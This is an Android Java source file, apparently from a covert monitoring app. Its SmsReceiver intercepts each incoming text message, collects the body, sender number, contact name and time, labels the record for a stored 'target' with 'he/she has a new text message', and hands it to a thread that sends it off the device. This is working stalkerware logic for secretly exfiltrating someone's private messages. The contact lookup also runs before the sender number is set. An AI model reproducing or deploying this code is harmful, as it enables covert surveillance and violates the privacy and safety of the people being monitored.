package com.example.receiver;

import java.text.SimpleDateFormat;
import java.util.Date;

import com.example.db.GeneralData;
import com.example.db.LocData;
import com.example.db.SMSData;
import com.example.thread.SendMsgThread;
import com.example.utils.MyUtils;
import com.example.utils.SharedpreferencesUtil;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		System.out.println("已拦截");
		System.out.println(intent.getAction() + "action");
		if (intent.getAction()
				.equals("android.provider.Telephony.SMS_RECEIVED")) {
			Bundle bundle = intent.getExtras();
			SmsMessage msg = null;
			String str = "";
			String time = "";
			String num = "";
			String display_name = "";
			if (null != bundle) {
				Object[] smsObj = (Object[]) bundle.get("pdus");
				for (Object object : smsObj) {
					msg = SmsMessage.createFromPdu((byte[]) object);
					Date date = new Date(msg.getTimestampMillis());// 时间
					SimpleDateFormat format = new SimpleDateFormat(
							"yyyy-MM-dd HH:mm:ss");
					String receiveTime = format.format(date);
					System.out.println("number:" + msg.getOriginatingAddress()
							+ "   body:" + msg.getDisplayMessageBody()
							+ "  time:" + msg.getTimestampMillis());
					str = str + msg.getDisplayMessageBody();
					try {
						display_name = MyUtils.getContactNameByNumber(num,
								context);
					} catch (Exception e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
						display_name = "unknown";
					}
					time = MyUtils.long2StringTime(msg.getTimestampMillis());
					num = msg.getOriginatingAddress();
				}
				String content = SMSData.SMS_IN + "#" + num + "#"
						+ display_name + "#" + System.currentTimeMillis() + "#"
						+ str;
				GeneralData gd = new GeneralData("TA有一条新短信", content,
						GeneralData.TYPE_SMS,
						new SharedpreferencesUtil(context).getTargetId());
				new SendMsgThread(gd, context).start();

			}
		} else if (intent.getAction().equals(
				"android.provider.Telephony.SMS_SEND")) {
			System.out.println("send msg");
		}

	}
}